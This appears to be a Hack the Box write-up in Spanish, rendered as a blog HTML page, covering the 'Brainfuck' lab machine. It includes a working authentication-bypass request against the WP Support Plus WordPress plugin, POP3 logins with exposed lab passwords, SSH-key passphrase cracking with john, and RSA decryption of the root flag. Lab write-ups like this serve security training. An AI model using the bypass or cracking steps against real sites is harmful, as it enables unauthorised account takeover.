@@ -1,0 +1,759 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Brainfuck - Hack the Box (Español) - x0pr4nt3s.io</title>
+<meta name="description" content="Brainfuck es una maquina especializada para aprender a explotar wordpress a traves de sus diferentes vulnerabilidades en los plugins y tambien poner a prueba temas de criptografia basica como por el ejemplo el cifrado polialfabetico y llega hasta temas como RSA.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="x0pr4nt3s.io">
+<meta property="og:title" content="Brainfuck - Hack the Box (Español)">
+<meta property="og:url" content="http://localhost:4000/brainfuck-writeup/">
+
+
+  <meta property="og:description" content="Brainfuck es una maquina especializada para aprender a explotar wordpress a traves de sus diferentes vulnerabilidades en los plugins y tambien poner a prueba temas de criptografia basica como por el ejemplo el cifrado polialfabetico y llega hasta temas como RSA.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/brainfuck-writeup/brainfuck_logo.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-05-12T00:00:00-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/brainfuck-writeup/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "x0pr4nt3s",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="x0pr4nt3s.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/logo_name.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Brainfuck - Hack the Box (Español)</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/vagabond.jpg" alt="x0pr4nt3s" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">x0pr4nt3s</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Red Team member<br>Computer Scientist<br>CEH Master/ eJPT
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Lima, Peru</span>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:cristhopermma@gmail.com">
+            <meta itemprop="email" content="cristhopermma@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/cristhoper-heredia" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/x0pr4nt3s" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Brainfuck - Hack the Box (Español)">
+    <meta itemprop="description" content="Brainfuck es una maquina especializada para aprender a explotar wordpress a traves de sus diferentes vulnerabilidades en los plugins y tambien poner a prueba temas de criptografia basica como por el ejemplo el cifrado polialfabetico y llega hasta temas como RSA.">
+    <meta itemprop="datePublished" content="May 12, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Brainfuck - Hack the Box (Español)
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-05-12T00:00:00-04:00">May 12, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p>Brainfuck es una maquina especializada para aprender a explotar wordpress a traves de sus diferentes vulnerabilidades en los plugins y tambien poner a prueba temas de criptografia basica como por el ejemplo el cifrado polialfabetico y llega hasta temas como RSA.</p>
+
+<h3 id="escaneo">Escaneo</h3>
+
+<p>Escaneamos los puertos de la maquina :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; nmap -p- 10.10.10.17
+
+PORT    STATE SERVICE
+22/tcp  open  ssh
+25/tcp  open  smtp
+110/tcp open  pop3
+143/tcp open  imap
+443/tcp open  https
+</code></pre></div></div>
+
+<p>Buscamos las versiones de estos servicios y contenido extra a traves de los scripts de nmap :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; nmap -sC -sV -p22,25,110,143,443 10.10.10.17
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
+|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
+|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+110/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE RESP-CODES PIPELINING TOP CAPA USER UIDL
+143/tcp open  imap     Dovecot imapd
+|_imap-capabilities: AUTH=PLAINA0001 ID IDLE IMAP4rev1 have OK capabilities post-login SASL-IR more listed LITERAL+ ENABLE LOGIN-REFERRALS Pre-login
+443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Not valid before: 2017-04-13T11:19:29
+|_Not valid after:  2027-04-11T11:19:29
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Lo primero que nos deberia llamar la atencion seria el puerto 443 que tiene un Subject Alternative Name lo que significa que esta compartiendo un solo certificado para varios subdominios, entonces para resolver estos subdominios los agregamos a nuestro /etc/hosts de esta manera :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
+</code></pre></div></div>
+
+<p>usuario encontrado en brainfuck.htb :</p>
+
+<p><img src="/assets/brainfuck-writeup/smtp_comment_info.png" alt="smtpinfo" /></p>
+
+<p>orestis@brainfuck.htb</p>
+
+<p>Con wappalyzzer podemos identificar que se esta usando un Wordpress 4.7.3, por lo que primero usamos wpscan para saber si podemos identificar algo mas :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; wpscan --url 'https://brainfuck.htb' --disable-tls-check -e u
+
+[i] Plugin(s) Identified:
+ |
+[+] wp-support-plus-responsive-ticket-system
+ | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ | Last Updated: 2019-09-03T07:57:00.000Z
+ | [!] The version is out of date, the latest version is 9.1.2
+ |
+ | Version: 7.1.3 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/read
+ |
+[i] User(s) Identified:
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] administrator
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+</code></pre></div></div>
+
+<h3 id="explotacion">Explotacion</h3>
+
+<p>Identificamos plugin que es posiblemente explotable wp-support-plus-responsive-ticket-system e identificamos dos nombres de usuarios mas  : admin, administrator.</p>
+
+<p>Bucamos posibles vulnerabilidades del plugin :</p>
+
+<p><img src="/assets/images/brainfuck-writeup/wp_support_ticket_vulns.png" alt="" /></p>
+
+<p>PoC de la vulnerabilidad :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form method="post" action="http://wp/wp-admin/admin-ajax.php"&gt;
+	Username: &lt;input type="text" name="username" value="administrator"&gt;
+	&lt;input type="hidden" name="email" value="sth"&gt;
+	&lt;input type="hidden" name="action" value="loginGuestFacebook"&gt;
+	&lt;input type="submit" value="Login"&gt;
+&lt;/form&gt;
+</code></pre></div></div>
+
+<p>Basicamente tenemos que enviar un POST a esa direccion con los valores que tenemos, por lo que encendemos nuestro burp hacemos cualquier peticion hacia la url de https://brainfuck.htb y cambiamos esa peticion por esta :</p>
+
+<p><img src="/assets/images/brainfuck-writeup/request_wp_admin.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: brainfuck.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 78
+DNT: 1
+Connection: close
+Cookie: wordpress_test_cookie=WP+Cookie+check
+Upgrade-Insecure-Requests: 1
+
+username=admin&amp;email=orestis%40brainfuck.htb&amp;action=loginGuestFacebook
+</code></pre></div></div>
+
+<p>Nos logueamos como admin e inspeccionamos el sitio.</p>
+
+<p>Encontramos la contraseña de orestis en la seccion de configuracion de SMTP :</p>
+
+<p><img src="/assets/images/brainfuck-writeup/pass_smtp.png" alt="" /></p>
+
+<p>inspeccionamos el codigo fuente y podemos ver la contraseña en claro.</p>
+
+<p>Por lo que nos conectamos a smtp para inspeccionar los correos recibidos por orestis :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nv 10.10.10.17 110
+(UNKNOWN) [10.10.10.17] 110 (pop3) open
++OK Dovecot ready.
+USER orestis
++OK
+PASS kHGuERB29DNiNE
++OK Logged in.
+list
++OK 2 messages:
+1 977
+2 514
+.
+retr 2
++OK 514 octets
+Return-Path: &lt;root@brainfuck.htb&gt;
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 0)
+	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;
+Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+From: root@brainfuck.htb (root)
+
+Hi there, your credentials for our "secret" forum are below :)
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards
+.
+</code></pre></div></div>
+
+<p>Encontramos credenciales de orestis, que es para el foro secreto por lo que intuyo que es para “sup3rs3cr3t.brainfuck.htb”.</p>
+
+<p>Ahora una vez ingresamos al foro encontramos mas hilos entre el admin y orestis, este foro es sumamente interesante ya que indica que el admin le pasara la clave para loggearse por ssh a orestis en otro hilo.</p>
+
+<p><img src="/assets/images/brainfuck-writeup/ssh_access.png" alt="" /></p>
+
+<p>Revisamos el foro encriptado :</p>
+
+<p><img src="/assets/images/brainfuck-writeup/key_access.png" alt="" /></p>
+
+<p>Ahora para identificar el tipo de cifrado que se usa en este foro revise esta linea :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
+</code></pre></div></div>
+
+<p>Tiene forma de url y en si parece que es una url, por lo que las 5 primeras letras deberian ser https pero al haber dos letras t nos podemos dar cuenta que no es un cifrado de sustitucion monoalfabetico por que las dos t deberian tener el mismo valor cifrado si fuera un cifrado de sustitucion monoalfabetico, por lo que deberia ser un cifrado de sustitucion polialfabetico.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>m n v z e
+h t t p s
+</code></pre></div></div>
+
+<p>El cifrado de sutitucion polialfabetico mas conocido es el cuadro de vignere ahora en caso de que fuera ese tipo de cifrado tenemos que encontrar una key para descifrar los mensajes.</p>
+
+<p>En este caso usamos esta herramienta :</p>
+
+<p><a href="https://github.com/x0pr4nt3s/vigenere_decrypt_with_key">https://github.com/x0pr4nt3s/vigenere_decrypt_with_key</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; python3 vigenere.py 'Qbqquzs-Pnhekxsdpifcafhfzdmgzt' 'Orestis-Hackingforfunandprofit'
+
+Resultado : 
+CkmybraAInfuckmybrainfuckmybra
+</code></pre></div></div>
+
+<p>Con esto identificamos que la clave es ‘FUCKMYBRAIN’, ahora con esto intentemos descifrar la url :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; python3 vigenere.py 'mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr' 'FUCKMYBRAIN'
+
+Resultado : 
+https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+</code></pre></div></div>
+
+<p>Con esto obtenemos el id_rsa de orestis. Ahora copiamos id_rsa  a un formato que john the ripper pueda leer para asi obtener el passphrase  :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; python3 ssh2john.py id_rsa &gt; hash
+</code></pre></div></div>
+
+<p>Nota : instale ssh2john de <a href="https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py">aqui</a></p>
+
+<p>Listo ahora aplicamos fuerza bruta para obtener el passphrase con :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+	Resultado : 3poulakia! 
+</code></pre></div></div>
+
+<p>Ya estamos dentro!!!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>orestis@brainfuck:~$ cat user.txt 
+************73ac15a3310bd097c9
+</code></pre></div></div>
+
+<h3 id="privesc">Privesc</h3>
+
+<p>ya dentro nos encontramos con esto :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nbits</span> <span class="o">=</span> <span class="mi">1024</span>
+
+<span class="n">password</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/root.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">enc_pass</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"output.txt"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span>
+<span class="n">debug</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"debug.txt"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span>
+<span class="n">m</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">),</span><span class="mi">16</span><span class="p">))</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">random_prime</span><span class="p">(</span><span class="mi">2</span><span class="o">^</span><span class="n">floor</span><span class="p">(</span><span class="n">nbits</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">lbound</span><span class="o">=</span><span class="mi">2</span><span class="o">^</span><span class="n">floor</span><span class="p">(</span><span class="n">nbits</span><span class="o">/</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="n">proof</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">q</span> <span class="o">=</span> <span class="n">random_prime</span><span class="p">(</span><span class="mi">2</span><span class="o">^</span><span class="n">floor</span><span class="p">(</span><span class="n">nbits</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">lbound</span><span class="o">=</span><span class="mi">2</span><span class="o">^</span><span class="n">floor</span><span class="p">(</span><span class="n">nbits</span><span class="o">/</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="n">proof</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
+<span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ZZ</span><span class="p">.</span><span class="n">random_element</span><span class="p">(</span><span class="n">phi</span><span class="p">)</span>
+<span class="k">while</span> <span class="n">gcd</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ZZ</span><span class="p">.</span><span class="n">random_element</span><span class="p">(</span><span class="n">phi</span><span class="p">)</span>
+
+
+
+<span class="n">c</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+<span class="n">enc_pass</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'Encrypted Password: '</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">debug</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">debug</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">debug</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Este archivo esta leyendo el contenido de root.txt y lo esta encriptando. Dentro de orestis/debug.txt tenemos los valores de p,q,e y tenemos el texto cifrado en output.txt.</p>
+
+<p>Investigando el codigo en google identificamos que es un algoritmo RSA estandar por lo que investigamos una manera de desencriptarlo y encontramos este codigo :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span>
+    <span class="k">while</span> <span class="n">a</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">q</span><span class="p">,</span> <span class="n">r</span> <span class="o">=</span> <span class="n">b</span><span class="o">//</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="o">%</span><span class="n">a</span>
+        <span class="n">m</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="n">x</span><span class="o">-</span><span class="n">u</span><span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="n">y</span><span class="o">-</span><span class="n">v</span><span class="o">*</span><span class="n">q</span>
+        <span class="n">b</span><span class="p">,</span><span class="n">a</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span> <span class="o">=</span> <span class="n">a</span><span class="p">,</span><span class="n">r</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span><span class="n">n</span>
+        <span class="n">gcd</span> <span class="o">=</span> <span class="n">b</span>
+    <span class="k">return</span> <span class="n">gcd</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="mi">1090660992520643446103273789680343</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="mi">1162435056374824133712043309728653</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+    <span class="n">ct</span> <span class="o">=</span> <span class="mi">299604539773691895576847697095098784338054746292313044353582078965</span>
+
+    <span class="c1"># compute n
+</span>    <span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+
+    <span class="c1"># Compute phi(n)
+</span>    <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+
+    <span class="c1"># Compute modular inverse of e
+</span>    <span class="n">gcd</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="n">a</span>
+
+    <span class="k">print</span><span class="p">(</span> <span class="s">"n:  "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="p">);</span>
+
+    <span class="c1"># Decrypt ciphertext
+</span>    <span class="n">pt</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">ct</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span> <span class="s">"pt: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span> <span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Colocamos cada una de las partes que nos dan los archivos debug.txt y output.txt en p,q,e y ct respectivamente, esto nos dara un valor en decimales por lo que tenemos que pasarlo a hexadecimal y por ultimo a binario</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root.txt: 6efc1a5d****************
+</code></pre></div></div>
+
+<h3 id="referencias">Referencias</h3>
+
+<ul>
+  <li>https://www.digicert.com/faq/subject-alternative-name.htm</li>
+  <li>http://www.dma.fi.upm.es/recursos/aplicaciones/matematica_discreta/web/aritmetica_modular/polialfabeto.html</li>
+  <li>https://es.wikipedia.org/wiki/RSA</li>
+  <li>https://ctftime.org/writeup/6434</li>
+  <li>https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e</li>
+</ul>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#criptografia" class="page__taxonomy-item" rel="tag">criptografia</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hash" class="page__taxonomy-item" rel="tag">hash</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">HTB</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wordpress" class="page__taxonomy-item" rel="tag">wordpress</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#writeup" class="page__taxonomy-item" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-05-12T00:00:00-04:00">May 12, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/tokyo-ghoul-thm/" class="pagination--pager" title="Tokyo Ghoul - Tryhackme (Español)
+">Previous</a>
+    
+    
+      <a href="/AD-Enum-without-RSAT/" class="pagination--pager" title="Enumeracion de Active Directory sin herramientas RSAT
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 x0pr4nt3s</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
